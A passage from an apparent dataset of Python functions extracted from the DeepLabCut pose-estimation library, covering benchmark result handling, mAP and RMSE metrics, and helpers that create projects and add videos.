    root_mean_squared_error = float('nan')
    try:
        predictions = self.get_predictions(name)
        mean_avg_precision = self.compute_pose_map(predictions)
        root_mean_squared_error = self.compute_pose_rmse(predictions)
    except Exception as exception:
        if on_error == 'ignore':
            return
        elif on_error == 'return':
            pass
        elif on_error == 'raise':
            raise BenchmarkEvaluationError(f'Error during benchmark evaluation for model {name}') from exception
        else:
            raise NotImplementedError() from exception
    return Result(method_name=name, benchmark_name=self.name, mean_avg_precision=mean_avg_precision, root_mean_squared_error=root_mean_squared_error)"
AlexEMG/DeepLabCut,primary_key,"@property
def primary_key(self) -> Tuple[str]:
    """"""The primary key to uniquely identify this result.""""""
    return tuple((getattr(self, k) for k in self._primary_key))"
AlexEMG/DeepLabCut,primary_key_names,"@property
def primary_key_names(self) -> Tuple[str]:
    """"""Names of the primary keys""""""
    return tuple((self._export_mapping.get(k) for k in self._primary_key))"
AlexEMG/DeepLabCut,__str__,"def __str__(self):
    return f'{self.method_name}, {self.benchmark_name}: {self.mean_avg_precision} mAP, {self.root_mean_squared_error} RMSE'"
AlexEMG/DeepLabCut,fromdict,"@classmethod
def fromdict(cls, data: dict):
    """"""Construct result object from dictionary.""""""
    kwargs = {attr: data[key] for (attr, key) in cls._export_mapping.items()}
    return cls(**kwargs)"
AlexEMG/DeepLabCut,todict,"def todict(self) -> dict:
    """"""Export result object to dictionary, with less verbose key names.""""""
    return {key: getattr(self, attr) for (attr, key) in self._export_mapping.items()}"
AlexEMG/DeepLabCut,__init__,"def __init__(self, *results):
    self.results = {result.primary_key: result for result in results}"
AlexEMG/DeepLabCut,primary_key_names,"@property
def primary_key_names(self):
    return next(iter(self.results.values())).primary_key_names"
AlexEMG/DeepLabCut,toframe,"def toframe(self) -> pd.DataFrame:
    """"""Convert results to pandas dataframe""""""
    return pd.DataFrame([result.todict() for result in self.results.values()]).set_index(list(self.primary_key_names))"
AlexEMG/DeepLabCut,add,"def add(self, result: Result):
    """"""Add a result to the collection.""""""
    if result.primary_key in self.results:
        raise ValueError('An entry for {result.primary_key} does already exist in this collection. Did you try to add the same result twice?')
    if len(self) > 0:
        if result.primary_key_names != self.primary_key_names:
            raise ValueError('Incompatible result format.')
    self.results[result.primary_key] = result"
AlexEMG/DeepLabCut,fromdicts,"@classmethod
def fromdicts(cls, data: Iterable[dict]):
    return cls(*[Result.fromdict(entry) for entry in data])"
AlexEMG/DeepLabCut,todicts,"def todicts(self):
    return [result.todict() for result in self.results.values()]"
AlexEMG/DeepLabCut,__len__,"def __len__(self):
    return len(self.results)"
AlexEMG/DeepLabCut,__contains__,"def __contains__(self, other: Result):
    if not isinstance(other, Result):
        raise ValueError(f'{type(self)} can only store objects of type Result, but got {type(other)}.')
    return other.primary_key in self.results"
AlexEMG/DeepLabCut,__eq__,"def __eq__(self, other):
    if not isinstance(other, ResultCollection):
        return False
    return other.results == self.results"
AlexEMG/DeepLabCut,compute_pose_map,"def compute_pose_map(self, results_objects):
    return deeplabcut.benchmark.metrics.calc_map_from_obj(results_objects, h5_file=self.ground_truth, metadata_file=self.metadata, oks_sigma=0.15, margin=10, symmetric_kpts=[(0, 4), (1, 3)])"
AlexEMG/DeepLabCut,compute_pose_rmse,"def compute_pose_rmse(self, results_objects):
    return deeplabcut.benchmark.metrics.calc_rmse_from_obj(results_objects, h5_file=self.ground_truth, metadata_file=self.metadata, drop_kpts=[4, 5])"
AlexEMG/DeepLabCut,compute_pose_map,"def compute_pose_map(self, results_objects):
    return deeplabcut.benchmark.metrics.calc_map_from_obj(results_objects, h5_file=self.ground_truth, metadata_file=self.metadata, drop_kpts=[4, 5])"
AlexEMG/DeepLabCut,_parse_args,"def _parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('--include', nargs='+', default=None, required=False)
    parser.add_argument('--onerror', default='return', required=False, choices=('ignore', 'return', 'raise'))
    parser.add_argument('--nocache', action='store_true')
    return parser.parse_args()"
AlexEMG/DeepLabCut,main,"def main():
    """"""Main CLI entry point for generating deeplabcut.benchmark results.""""""
    args = _parse_args()
    if not args.nocache:
        results = deeplabcut.benchmark.loadcache()
    else:
        results = None
    results = deeplabcut.benchmark.evaluate(include_benchmarks=args.include, results=results, on_error=args.onerror)
    if not args.nocache:
        deeplabcut.benchmark.savecache(results)
    try:
        print(results.toframe())
    except StopIteration:
        pass"
AlexEMG/DeepLabCut,_format_gt_data,"def _format_gt_data(h5file):
    df = pd.read_hdf(h5file)
    animals = _get_unique_level_values(df.columns, 'individuals')
    kpts = _get_unique_level_values(df.columns, 'bodyparts')
    try:
        n_unique = len(_get_unique_level_values(df.xs('single', level='individuals', axis=1).columns, 'bodyparts'))
    except KeyError:
        n_unique = 0
    guarantee_multiindex_rows(df)
    file_paths = [os.path.join(*row) for row in df.index.to_list()]
    temp = df.stack('individuals', dropna=False).reindex(animals, level='individuals').reindex(kpts, level='bodyparts', axis=1)
    data = temp.to_numpy().reshape((len(file_paths), len(animals), -1, 2))
    meta = {'animals': animals, 'keypoints': kpts, 'n_unique': n_unique}
    return {'annotations': dict(zip(file_paths, data)), 'metadata': meta}"
AlexEMG/DeepLabCut,_get_unique_level_values,"def _get_unique_level_values(header, level):
    return header.get_level_values(level).unique().to_list()"
AlexEMG/DeepLabCut,calc_prediction_errors,"def calc_prediction_errors(preds, gt):
    kpts_gt = gt['metadata']['keypoints']
    kpts_pred = preds['metadata']['keypoints']
    map_ = {kpts_gt.index(kpt): i for (i, kpt) in enumerate(kpts_pred)}
    annot = gt['annotations']
    map_images = _map(list(preds['predictions']), list(annot))
    errors = np.full((len(preds['predictions']), len(gt['metadata']['animals']), len(kpts_gt), 2), np.nan)
    for (n, (path, preds_)) in enumerate(preds['predictions'].items()):
        if not preds_:
            continue
        xy_gt = annot[map_images[path]].swapaxes(0, 1)
        xy_pred = preds_['coordinates'][0]
        conf_pred = preds_['confidence']
        for (i, xy_gt_) in enumerate(xy_gt):
            visible = np.flatnonzero(np.all(~np.isnan(xy_gt_), axis=1))
            xy_pred_ = xy_pred[map_[i]]
            if visible.size and xy_pred_.size:
                neighbors = evaluate_multianimal._find_closest_neighbors(xy_gt_[visible], xy_pred_, k=3)
                found = neighbors != -1
                if ~np.any(found):
                    continue
                min_dists = np.linalg.norm(xy_gt_[visible][found] - xy_pred_[neighbors[found]], axis=1)
                conf_pred_ = conf_pred[map_[i]]
                errors[n, visible[found], i, 0] = min_dists
                errors[n, visible[found], i, 1] = conf_pred_[neighbors[found], 0]
    return errors"
AlexEMG/DeepLabCut,_map,"def _map(strings, substrings):
    """"""
    Map image paths from predicted data to GT as the first are typically
    absolute whereas the latter are relative to the project path.
    """"""
    lookup = dict()
    strings_ = strings.copy()
    substrings_ = substrings.copy()
    while strings_:
        string = strings_.pop()
        for s in substrings_:
            if string.endswith(s):
                lookup[string] = s
                substrings_.remove(s)
                break
    return lookup"
AlexEMG/DeepLabCut,conv_obj_to_assemblies,"def conv_obj_to_assemblies(eval_results_obj, keypoint_names):
    """"""Convert predictions to deeplabcut assemblies.""""""
    assemblies = {}
    for (image_path, results) in eval_results_obj.items():
        lst = []
        for dict_ in results:
            ass = inferenceutils.Assembly(len(keypoint_names))
            for (i, kpt) in enumerate(keypoint_names):
                xy = dict_['pose'][kpt]
                if ~np.isnan(xy).all():
                    joint = inferenceutils.Joint(pos=xy, label=i)
                    ass.add_joint(joint)
            ass._affinity = dict_['score']
            ass._links = [None]
            if len(ass):
                lst.append(ass)
        assemblies[image_path] = lst
    return assemblies"
AlexEMG/DeepLabCut,calc_map_from_obj,"def calc_map_from_obj(eval_results_obj, h5_file, metadata_file, oks_sigma=0.1, margin=0, symmetric_kpts=None, drop_kpts=None):
    """"""Calculate mean average precision (mAP) based on predictions.""""""
    df = pd.read_hdf(h5_file)
    try:
        df.drop('single', level='individuals', axis=1, inplace=True)
    except KeyError:
        pass
    n_animals = len(df.columns.get_level_values('individuals').unique())
    kpts = list(df.columns.get_level_values('bodyparts').unique())
    image_paths = list(eval_results_obj)
    ground_truth = df.loc[image_paths].to_numpy().reshape((len(image_paths), n_animals, -1, 2))
    temp = np.ones((*ground_truth.shape[:3], 3))
    temp[..., :2] = ground_truth
    assemblies_gt = inferenceutils._parse_ground_truth_data(temp)
    with open(metadata_file, 'rb') as f:
        inds_test = set(pickle.load(f)[2])
    assemblies_gt_test = {k: v for (k, v) in assemblies_gt.items() if k in inds_test}
    if drop_kpts is not None:
        temp = {}
        for (k, v) in assemblies_gt_test.items():
            lst = []
            for a in v:
                arr = np.delete(a.data[:, :3], drop_kpts, axis=0)
                a = inferenceutils.Assembly.from_array(arr)
                lst.append(a)
            temp[k] = lst
        assemblies_gt_test = temp
        for ind in sorted(drop_kpts, reverse=True):
            kpts.pop(ind)
    assemblies_pred_ = conv_obj_to_assemblies(eval_results_obj, kpts)
    assemblies_pred = dict(enumerate(assemblies_pred_.values()))
    with deeplabcut.benchmark.utils.DisableOutput():
        oks = inferenceutils.evaluate_assembly(assemblies_pred, assemblies_gt_test, oks_sigma, margin=margin, symmetric_kpts=symmetric_kpts)
    return oks['mAP']"
AlexEMG/DeepLabCut,calc_rmse_from_obj,"def calc_rmse_from_obj(eval_results_obj, h5_file, metadata_file, drop_kpts=None):
    """"""Calc prediction errors for submissions.""""""
    gt = _format_gt_data(h5_file)
    kpts = gt['metadata']['keypoints']
    if drop_kpts:
        for (k, v) in gt['annotations'].items():
            gt['annotations'][k] = np.delete(v, drop_kpts, axis=1)
        for ind in sorted(drop_kpts, reverse=True):
            kpts.pop(ind)
    with open(metadata_file, 'rb') as f:
        inds_test = set(pickle.load(f)[2])
    test_objects = {k: v for (i, (k, v)) in enumerate(eval_results_obj.items()) if i in inds_test}
    assemblies_pred = conv_obj_to_assemblies(test_objects, kpts)
    preds = defaultdict(dict)
    preds['metadata']['keypoints'] = kpts
    for (image, assemblies) in assemblies_pred.items():
        if assemblies:
            arr = np.stack([a.data for a in assemblies]).swapaxes(0, 1)
            data = [xy[~np.isnan(xy).any(axis=1)] for xy in arr[..., :2]]
            temp = {'coordinates': tuple([data]), 'confidence': list(np.expand_dims(arr[..., 2], axis=2))}
            preds['predictions'][image] = temp
    with deeplabcut.benchmark.utils.DisableOutput():
        errors = calc_prediction_errors(preds, gt)
    return np.nanmean(errors[..., 0])"
AlexEMG/DeepLabCut,import_submodules,"def import_submodules(package, recursive=True):
    """"""Import all submodules of a module, recursively, including subpackages

    :param package: package (name or actual module)
    :type package: str | module
    :rtype: dict[str, types.ModuleType]

    Reference:
        https://stackoverflow.com/a/25562415
        CC BY-SA 3.0, https://stackoverflow.com/users/712522/mr-b
    """"""
    if isinstance(package, str):
        package = importlib.import_module(package)
    results = {}
    for (loader, name, is_pkg) in pkgutil.walk_packages(package.__path__):
        full_name = package.__name__ + '.' + name
        results[full_name] = importlib.import_module(full_name)
        if recursive and is_pkg:
            results.update(import_submodules(full_name))
    return results"
AlexEMG/DeepLabCut,__init__,"def __init__(self, stdout=None, stderr=None):
    self._stdout = stdout or sys.stdout
    self._stderr = stderr or sys.stderr"
AlexEMG/DeepLabCut,__enter__,"def __enter__(self):
    (self.old_stdout, self.old_stderr) = (sys.stdout, sys.stderr)
    self.old_stdout.flush()
    self.old_stderr.flush()
    (sys.stdout, sys.stderr) = (self._stdout, self._stderr)"
AlexEMG/DeepLabCut,__exit__,"def __exit__(self, exc_type, exc_value, traceback):
    self._stdout.flush()
    self._stderr.flush()
    sys.stdout = self.old_stdout
    sys.stderr = self.old_stderr"
AlexEMG/DeepLabCut,__init__,"def __init__(self):
    devnull = open(os.devnull, 'w')
    super().__init__(stdout=devnull, stderr=devnull)"
AlexEMG/DeepLabCut,add_new_videos,"def add_new_videos(config, videos, copy_videos=False, coords=None, extract_frames=False):
    """"""
    Add new videos to the config file at any stage of the project.

    Parameters
    ----------
    config : string
        String containing the full path of the config file in the project.

    videos : list
        A list of strings containing the full paths of the videos to include in the project.

    copy_videos : bool, optional
        If this is set to True, the videos will be copied to your project/videos directory. If False, the symlink of the
        videos will be copied instead. The default is
        ``False``; if provided it must be either ``True`` or ``False``.

    coords: list, optional
        A list containing the list of cropping coordinates of the video. The default is set to None.

    extract_frames: bool, optional
        if this is set to True extract_frames will be run on the new videos

    Examples
    --------
    Video will be added, with cropping dimensions according to the frame dimensions of mouse5.avi
    >>> deeplabcut.add_new_videos('/home/project/reaching-task-Tanmay-2018-08-23/config.yaml',['/data/videos/mouse5.avi'])

    Video will be added, with cropping dimensions [0,100,0,200]
    >>> deeplabcut.add_new_videos('/home/project/reaching-task-Tanmay-2018-08-23/config.yaml',['/data/videos/mouse5.avi'],copy_videos=False,coords=[[0,100,0,200]])

    Two videos will be added, with cropping dimensions [0,100,0,200] and [0,100,0,250], respectively.
    >>> deeplabcut.add_new_videos('/home/project/reaching-task-Tanmay-2018-08-23/config.yaml',['/data/videos/mouse5.avi','/data/videos/mouse6.avi'],copy_videos=False,coords=[[0,100,0,200],[0,100,0,250]])

    """"""
    import os
    import shutil
    from pathlib import Path
    from deeplabcut.utils import auxiliaryfunctions
    from deeplabcut.utils.auxfun_videos import VideoReader
    from deeplabcut.generate_training_dataset import frame_extraction
    cfg = auxiliaryfunctions.read_config(config)
    if isinstance(videos, str):
        videos = [videos]
    video_path = Path(config).parents[0] / 'videos'
    data_path = Path(config).parents[0] / 'labeled-data'
    videos = [Path(vp) for vp in videos]
    dirs = [data_path / Path(i.stem) for i in videos]
    for p in dirs:
        '\n        Creates directory under data & perhaps copies videos (to /video)\n        '
        p.mkdir(parents=True, exist_ok=True)
    destinations = [video_path.joinpath(vp.name) for vp in videos]
    if copy_videos:
        for (src, dst) in zip(videos, destinations):
            if dst.exists():
                pass
            else:
                print('Copying the videos')
                shutil.copy(os.fspath(src), os.fspath(dst))
    else:
        print('Attempting to create a symbolic link of the video ...')
        for (src, dst) in zip(videos, destinations):
            if dst.exists():
                print(f'Video {dst} already exists. Skipping...')
                continue
            try:
                src = str(src)
                dst = str(dst)
                os.symlink(src, dst)
                print('Created the symlink of {} to {}'.format(src, dst))
            except OSError:
                try:
                    import subprocess
                    subprocess.check_call('mklink %s %s' % (dst, src), shell=True)
                except (OSError, subprocess.CalledProcessError):
                    print('Symlink creation impossible (exFat architecture?): copying the video instead.')
                    shutil.copy(os.fspath(src), os.fspath(dst))
                    print('{} copied to {}'.format(src, dst))
            videos = destinations
    if copy_videos:
        videos = destinations
    for (idx, video) in enumerate(videos):
        try:
            video_path = str(Path.resolve(Path(video)))
        except:
            video_path = os.readlink(video)
        vid = VideoReader(video_path)
        if coords is not None:
            c = coords[idx]
        else:
            c = vid.get_bbox()
        params = {video_path: {'crop': ', '.join(map(str, c))}}
        if 'video_sets_original' not in cfg:
            cfg['video_sets'].update(params)
        else:
            cfg['video_sets_original'].update(params)
    videos_str = [str(video) for video in videos]
    auxiliaryfunctions.write_config(config, cfg)
    if extract_frames:
        frame_extraction.extract_frames(config, userfeedback=False, videos_list=videos_str)
        print('New videos were added to the project and frames have been extracted for labeling!')
    else:
        print(""New videos were added to the project! Use the function 'extract_frames' to select frames for labeling."")"
AlexEMG/DeepLabCut,load_demo_data,"def load_demo_data(config, createtrainingset=True):
    """"""
    Loads the demo data -- subset from trail-tracking data in Mathis et al. 2018.
    When loading, it sets paths correctly to run this project on your system

    Parameter
      ----------
      config : string
          Full path of the config.yaml file of the provided demo dataset as a string.

      createtrainingset : bool
          Boolean variable indicating if a training set shall be created.

      Example
      --------
      >>> deeplabcut.load_demo_data('config.yaml')
      --------
    """"""
    config = Path(config).resolve()
    config = str(config)
    transform_data(config)
    if createtrainingset:
        print('Loaded, now creating training data...')
        deeplabcut.create_training_dataset(config, num_shuffles=1)"
AlexEMG/DeepLabCut,transform_data,"def transform_data(config):
    """"""
    This function adds the full path to labeling dataset.
    It also adds the correct path to the video file in the config file.
    """"""
    cfg = auxiliaryfunctions.read_config(config)
    project_path = str(Path(config).parents[0])
    cfg['project_path'] = project_path
    if 'Reaching' in project_path:
        video_file = os.path.join(project_path, 'videos', 'reachingvideo1.avi')
    elif 'openfield' in project_path:
        video_file = os.path.join(project_path, 'videos', 'm4s1.mp4')
    else:
        print('This is not an official demo dataset.')
    if 'WILL BE AUTOMATICALLY UPDATED BY DEMO CODE' in cfg['video_sets'].keys():
        cfg['video_sets'][str(video_file)] = cfg['video_sets'].pop('WILL BE AUTOMATICALLY UPDATED BY DEMO CODE')
    auxiliaryfunctions.write_config(config, cfg)"
AlexEMG/DeepLabCut,MakeTrain_pose_yaml,"def MakeTrain_pose_yaml(itemstochange, saveasconfigfile, defaultconfigfile):
    raw = open(defaultconfigfile).read()
    docs = []
    for raw_doc in raw.split('\n---'):
        try:
            docs.append(yaml.load(raw_doc, Loader=yaml.SafeLoader))
        except SyntaxError:
            docs.append(raw_doc)
    for key in itemstochange.keys():
        docs[0][key] = itemstochange[key]
    docs[0]['max_input_size'] = 1500
    with open(saveasconfigfile, 'w') as f:
        yaml.dump(docs[0], f)
    return docs[0]"
AlexEMG/DeepLabCut,UpdateTrain_pose_yaml,"def UpdateTrain_pose_yaml(dict_train, dict2change, saveasfile):
    for key in dict2change.keys():
        dict_train[key] = dict2change[key]
    auxiliaryfunctions.write_plainconfig(saveasfile, dict_train)"
AlexEMG/DeepLabCut,MakeTest_pose_yaml,"def MakeTest_pose_yaml(dictionary, keys2save, saveasfile):
    dict_test = {}
    for key in keys2save:
        dict_test[key] = dictionary[key]
    dict_test['scoremap_dir'] = 'test'
    dict_test['global_scale'] = 1.0
    auxiliaryfunctions.write_plainconfig(saveasfile, dict_test)"
AlexEMG/DeepLabCut,create_pretrained_human_project,"def create_pretrained_human_project(project, experimenter, videos, working_directory=None, copy_videos=False, videotype='', createlabeledvideo=True, analyzevideo=True):
    """"""
    LEGACY FUNCTION will be deprecated.

    Use deeplabcut.create_pretrained_project(project, experimenter, videos, model='full_human', ..)

    For now just calls that function....

    Creates a demo human project and analyzes a video with ResNet 101 weights pretrained on
    MPII Human Pose. This is from the DeeperCut paper by Insafutdinov et al. https://arxiv.org/abs/1605.03170
    Please make sure to cite it too if you use this code!
    """"""
    print(""LEGACY FUNCTION will be deprecated.... use  deeplabcut.create_pretrained_project(project, experimenter, videos, model='full_human', ..) in the future!"")
    create_pretrained_project(project, experimenter, videos, model='full_human', working_directory=working_directory, copy_videos=copy_videos, videotype=videotype, createlabeledvideo=createlabeledvideo, analyzevideo=analyzevideo)"
AlexEMG/DeepLabCut,create_pretrained_project,"def create_pretrained_project(project, experimenter, videos, model='full_human', working_directory=None, copy_videos=False, videotype='', analyzevideo=True, filtered=True, createlabeledvideo=True, trainFraction=None):
    """"""
    Creates a new project directory, sub-directories and a basic configuration file.
    Change its parameters to your projects need.

    The project will also be initialized with a pre-trained model from the DeepLabCut model zoo!

    http://modelzoo.deeplabcut.org

    Parameters
    ----------
    project : string
        String containing the name of the project.

    experimenter : string
        String containing the name of the experimenter.

    model: string, options see  http://www.mousemotorlab.org/dlc-modelzoo
        Current option and default: 'full_human'  Creates a demo human project and analyzes a video with ResNet 101 weights pretrained on MPII Human Pose. This is from the DeeperCut paper
        by Insafutdinov et al. https://arxiv.org/abs/1605.03170 Please make sure to cite it too if you use this code!

    videos : list
        A list of string containing the full paths of the videos to include in the project.

    working_directory : string, optional
        The directory where the project will be created. The default is the ``current working directory``; if provided, it must be a string.

    copy_videos : bool, optional  ON WINDOWS: TRUE is often necessary!
        If this is set to True, the videos are copied to the ``videos`` directory. If it is False,symlink of the videos are copied to the project/videos directory. The default is ``False``; if provided it must be either
        ``True`` or ``False``.

    analyzevideo "" bool, optional
        If true, then the video is analyzed and a labeled video is created. If false, then only the project will be created and the weights downloaded. You can then access them

    filtered: bool, default false
        Boolean variable indicating if filtered pose data output should be plotted rather than frame-by-frame predictions.
        Filtered version can be calculated with deeplabcut.filterpredictions

    trainFraction: By default value from *new* projects. (0.95)
            Fraction that will be used in dlc-model/trainingset folder name.

    Example
    --------
    Linux/MacOs loading full_human model and analyzing video /homosapiens1.avi
    >>> deeplabcut.create_pretrained_project('humanstrokestudy','Linus',['/data/videos/homosapiens1.avi'], copy_videos=False)

    Loading full_cat model and analyzing video ""felixfeliscatus3.avi""
    >>> deeplabcut.create_pretrained_project('humanstrokestudy','Linus',['/data/videos/felixfeliscatus3.avi'], model='full_cat')

    Windows:
    >>> deeplabcut.create_pretrained_project('humanstrokestudy','Bill',[r'C:\\yourusername\rig-95\\Videos\reachingvideo1.avi'],r'C:\\yourusername\x07nalysis\\project' copy_videos=True)
    Users must format paths with either:  r'C:\\ OR 'C:\\ <- i.e. a double backslash \\ \\ )

    """"""
    if model in MODELOPTIONS:
        cwd = os.getcwd()
        cfg = deeplabcut.create_new_project(project, experimenter, videos, working_directory, copy_videos, videotype)
        if trainFraction is not None:
            auxiliaryfunctions.edit_config(cfg, {'TrainingFraction': [trainFraction]})
        config = auxiliaryfunctions.read_config(cfg)
        if model == 'full_human':
            config['bodyparts'] = ['ankle1', 'knee1', 'hip1', 'hip2', 'knee2', 'ankle2', 'wrist1', 'elbow1', 'shoulder1', 'shoulder2', 'elbow2', 'wrist2', 'chin', 'forehead']
            config['skeleton'] = [['ankle1', 'knee1'], ['ankle2', 'knee2'], ['knee1', 'hip1'], ['knee2', 'hip2'], ['hip1', 'hip2'], ['shoulder1', 'shoulder2'], ['shoulder1', 'hip1'], ['shoulder2', 'hip2'], ['shoulder1', 'elbow1'], ['shoulder2', 'elbow2'], ['chin', 'forehead'], ['elbow1', 'wrist1'], ['elbow2', 'wrist2']]
            config['default_net_type'] = 'resnet_101'
        else:
            pass
        auxiliaryfunctions.write_config(cfg, config)
        config = auxiliaryfunctions.read_config(cfg)
        train_dir = Path(os.path.join(config['project_path'], str(auxiliaryfunctions.get_model_folder(trainFraction=config['TrainingFraction'][0], shuffle=1, cfg=config)), 'train'))
        test_dir = Path(os.path.join(config['project_path'], str(auxiliaryfunctions.get_model_folder(trainFraction=config['TrainingFraction'][0], shuffle=1, cfg=config)), 'test'))
        train_dir.mkdir(parents=True, exist_ok=True)
        test_dir.mkdir(parents=True, exist_ok=True)
        modelfoldername = auxiliaryfunctions.get_model_folder(trainFraction=config['TrainingFraction'][0], shuffle=1, cfg=config)
        path_train_config = str(os.path.join(config['project_path'], Path(modelfoldername), 'train', 'pose_cfg.yaml'))
        path_test_config = str(os.path.join(config['project_path'], Path(modelfoldername), 'test', 'pose_cfg.yaml'))
        print('Downloading weights...')
        download_huggingface_model(model, train_dir)
        pose_cfg = deeplabcut.auxiliaryfunctions.read_plainconfig(path_train_config)
        pose_cfg['dataset_type'] = 'imgaug'
        print(path_train_config)
        dict_ = {'default_net_type': pose_cfg['net_type'], 'default_augmenter': pose_cfg['dataset_type'], 'bodyparts': pose_cfg['all_joints_names'], 'dotsize': 6}
        auxiliaryfunctions.edit_config(cfg, dict_)
        snapshotname = [fn for fn in os.listdir(train_dir) if '.meta' in fn][0].split('.meta')[0]
        dict2change = {'init_weights': str(os.path.join(train_dir, snapshotname)), 'project_path': str(config['project_path'])}
        UpdateTrain_pose_yaml(pose_cfg, dict2change, path_train_config)
        keys2save = ['dataset', 'dataset_type', 'num_joints', 'all_joints', 'all_joints_names', 'net_type', 'init_weights', 'global_scale', 'location_refinement', 'locref_stdev']
        MakeTest_pose_yaml(pose_cfg, keys2save, path_test_config)
        video_dir = os.path.join(config['project_path'], 'videos')
        if analyzevideo == True:
            print('Analyzing video...')
            deeplabcut.analyze_videos(cfg, [video_dir], videotype, save_as_csv=True)
        if createlabeledvideo == True:
            if filtered:
                deeplabcut.filterpredictions(cfg, [video_dir], videotype)
            print('Plotting results...')
            deeplabcut.create_labeled_video(cfg, [video_dir], videotype, draw_skeleton=True, filtered=filtered)
            deeplabcut.plot_trajectories(cfg, [video_dir], videotype, filtered=filtered)
        os.chdir(cwd)
        return (cfg, path_train_config)
    else:
        return ('N/A', 'N/A')"
AlexEMG/DeepLabCut,create_new_project,"def create_new_project(project, experimenter, videos, working_directory=None, copy_videos=False, videotype='', multianimal=False):
    """"""Create the necessary folders and files for a new project.

    Creating a new project involves creating the project directory, sub-directories and
    a basic configuration file. The configuration file is loaded with the default
    values. Change its parameters to your projects need.

    Parameters
    ----------
    project : string
        The name of the project.

    experimenter : string
        The name of the experimenter.

    videos : list[str]
        A list of strings representing the full paths of the videos to include in the
        project. If the strings represent a directory instead of a file, all videos of
        ``videotype`` will be imported.

    working_directory : string, optional
        The directory where the project will be created. The default is the
        ``current working directory``.

    copy_videos : bool, optional, Default: False.
        If True, the videos are copied to the ``videos`` directory. If False, symlinks
        of the videos will be created in the ``project/videos`` directory; in the event
        of a failure to create symbolic links, videos will be moved instead.

    multianimal: bool, optional. Default: False.
        For creating a multi-animal project (introduced in DLC 2.2)

    Returns
    -------
    str
        Path to the new project configuration file.

    Examples
    --------

    Linux/MacOS:

    >>> deeplabcut.create_new_project(
            project='reaching-task',
            experimenter='Linus',
            videos=[
                '/data/videos/mouse1.avi',
                '/data/videos/mouse2.avi',
                '/data/videos/mouse3.avi'
            ],
            working_directory='/analysis/project/',
        )
    >>> deeplabcut.create_new_project(
            project='reaching-task',
            experimenter='Linus',
            videos=['/data/videos'],
            videotype='.mp4',
        )

    Windows:

    >>> deeplabcut.create_new_project(
            'reaching-task',
            'Bill',
            [r'C:\\yourusername\\rig-95\\Videos\\reachingvideo1.avi'],
            copy_videos=True,
        )

    Users must format paths with either:  r'C:\\ OR 'C:\\\\ <- i.e. a double backslash \\ \\ )
    """"""
    from datetime import datetime as dt
    from deeplabcut.utils import auxiliaryfunctions
    months_3letter = {1: 'Jan', 2: 'Feb', 3: 'Mar', 4: 'Apr', 5: 'May', 6: 'Jun', 7: 'Jul', 8: 'Aug', 9: 'Sep', 10: 'Oct', 11: 'Nov', 12: 'Dec'}
    date = dt.today()
    month = months_3letter[date.month]
    day = date.day
    d = str(month[0:3] + str(day))
    date = dt.today().strftime('%Y-%m-%d')
    if working_directory is None:
        working_directory = '.'
    wd = Path(working_directory).resolve()
    project_name = '{pn}-{exp}-{date}'.format(pn=project, exp=experimenter, date=date)
    project_path = wd / project_name
    if not DEBUG and project_path.exists():
        print('Project ""{}"" already exists!'.format(project_path))
        return os.path.join(str(project_path), 'config.yaml')
    video_path = project_path / 'videos'
    data_path = project_path / 'labeled-data'
    shuffles_path = project_path / 'training-datasets'
    results_path = project_path / 'dlc-models'
    for p in [video_path, data_path, shuffles_path, results_path]:
        p.mkdir(parents=True, exist_ok=DEBUG)
        print('Created ""{}""'.format(p))
    vids = []
    for i in videos:
        if os.path.isdir(i):
            vids_in_dir = [os.path.join(i, vp) for vp in os.listdir(i) if vp.endswith(videotype)]
            vids = vids + vids_in_dir
            if len(vids_in_dir) == 0:
                print('No videos found in', i)
                print('Perhaps change the videotype, which is currently set to:', videotype)
            else:
                videos = vids
                print(len(vids_in_dir), ' videos from the directory', i, 'were added to the project.')
        else:
            if os.path.isfile(i):
                vids = vids + [i]
            videos = vids
    videos = [Path(vp) for vp in videos]
    dirs = [data_path / Path(i.stem) for i in videos]
    for p in dirs:
        '\n        Creates directory under data\n        '
        p.mkdir(parents=True, exist_ok=True)
    destinations = [video_path.joinpath(vp.name) for vp in videos]
    if copy_videos:
        print('Copying the videos')
        for (src, dst) in zip(videos, destinations):
            shutil.copy(os.fspath(src), os.fspath(dst))
    else:
        print('Attempting to create a symbolic link of the video ...')
        for (src, dst) in zip(videos, destinations):
            if dst.exists() and (not DEBUG):
                raise FileExistsError('Video {} exists already!'.format(dst))
            try:
                src = str(src)
                dst = str(dst)
                os.symlink(src, dst)
                print('Created the symlink of {} to {}'.format(src, dst))
            except OSError:
                try:
                    import subprocess
                    subprocess.check_call('mklink %s %s' % (dst, src), shell=True)
                except (OSError, subprocess.CalledProcessError):
                    print('Symlink creation impossible (exFat architecture?): copying the video instead.')
                    shutil.copy(os.fspath(src), os.fspath(dst))
                    print('{} copied to {}'.format(src, dst))
            videos = destinations
    if copy_videos:
        videos = destinations
    video_sets = {}
    for video in videos:
        print(video)
        try:
            rel_video_path = str(Path.resolve(Path(video)))
        except:
            rel_video_path = os.readlink(str(video))
        try:
            vid = VideoReader(rel_video_path)
            video_sets[rel_video_path] = {'crop': ', '.join(map(str, vid.get_bbox()))}
        except IOError:
            warnings.warn('Cannot open the video file! Skipping to the next one...')
            os.remove(video)
    if not len(video_sets):
        shutil.rmtree(project_path, ignore_errors=True)
        warnings.warn('No valid videos were found. The project was not created... Verify the video files and re-create the project.')
        return 'nothingcreated'
    if multianimal:
        (cfg_file, ruamelFile) = auxiliaryfunctions.create_config_template(multianimal)
        cfg_file['multianimalproject'] = multianimal
        cfg_file['identity'] = False
        cfg_file['individuals'] = ['individual1', 'individual2', 'individual3']
        cfg_file['multianimalbodyparts'] = ['bodypart1', 'bodypart2', 'bodypart3']
        cfg_file['uniquebodyparts'] = []
        cfg_file['bodyparts'] = 'MULTI!'
        cfg_file['skeleton'] = [['bodypart1', 'bodypart2'], ['bodypart2', 'bodypart3'], ['bodypart1', 'bodypart3']]
        cfg_file['default_augmenter'] = 'multi-animal-imgaug'
        cfg_file['default_net_type'] = 'dlcrnet_ms5'
        cfg_file['default_track_method'] = 'ellipse'
    else:
        (cfg_file, ruamelFile) = auxiliaryfunctions.create_config_template()
        cfg_file['multianimalproject'] = False
        cfg_file['bodyparts'] = ['bodypart1', 'bodypart2', 'bodypart3', 'objectA']
        cfg_file['skeleton'] = [['bodypart1', 'bodypart2'], ['objectA', 'bodypart3']]
        cfg_file['default_augmenter'] = 'default'
        cfg_file['default_net_type'] = 'resnet_50'
    cfg_file['Task'] = project
    cfg_file['scorer'] = experimenter
    cfg_file['video_sets'] = video_sets
    cfg_file['project_path'] = str(project_path)
    cfg_file['date'] = d
